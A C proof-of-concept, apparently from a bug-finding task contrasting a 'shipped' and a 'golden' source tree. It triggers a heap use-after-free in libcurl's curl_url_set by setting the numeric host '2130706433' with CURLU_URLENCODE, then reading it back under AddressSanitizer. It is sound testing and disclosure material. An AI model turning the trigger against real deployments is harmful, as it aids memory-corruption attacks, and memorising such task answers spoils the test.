/* PoC: use-after-free in curl_url_set(CURLUPART_HOST, ...) when a legacy
 * numeric IPv4 host is set with CURLU_URLENCODE.
 *
 * curl_url_set() caches the host buffer pointer before url_sethost() runs.
 * When the host is normalized, the shipped tree replaces the host dynbuf with
 * a freshly allocated buffer and frees the original, leaving the cached
 * pointer dangling. That dangling pointer is then stored as u->host and read
 * back by curl_url_get().
 *
 * Entry point: only public libcurl URL API, in-contract input.
 *   fire on shipped tree  = heap-use-after-free (ASan abort)
 *   golden tree           = normalizes in place, returns "127.0.0.1", no abort
 *
 * Build (static, ASan):
 *   cc -fsanitize=address -I include pocs/residual.c \
 *      buildasan/lib/libcurl-d.a <deps> -o /tmp/residual
 *   ./tmp/residual
 */
#include <stdio.h>
#include <curl/curl.h>

int main(void)
{
  CURLU *u = curl_url();
  CURLUcode rc;
  char *host = NULL;

  if(!u)
    return 2;

  curl_url_set(u, CURLUPART_SCHEME, "http", 0);

  /* in-contract: a valid host string, set with the documented URL-encode
     flag. "2130706433" is the legacy numeric spelling of 127.0.0.1 */
  rc = curl_url_set(u, CURLUPART_HOST, "2130706433", CURLU_URLENCODE);
  if(rc) {
    fprintf(stderr, "set host failed: %d\n", (int)rc);
    curl_url_cleanup(u);
    return 2;
  }

  /* reads u->host, which on the shipped tree points at freed memory */
  rc = curl_url_get(u, CURLUPART_HOST, &host, 0);
  if(!rc)
    printf("host = %s\n", host);

  curl_free(host);
  curl_url_cleanup(u);
  return 0;
}
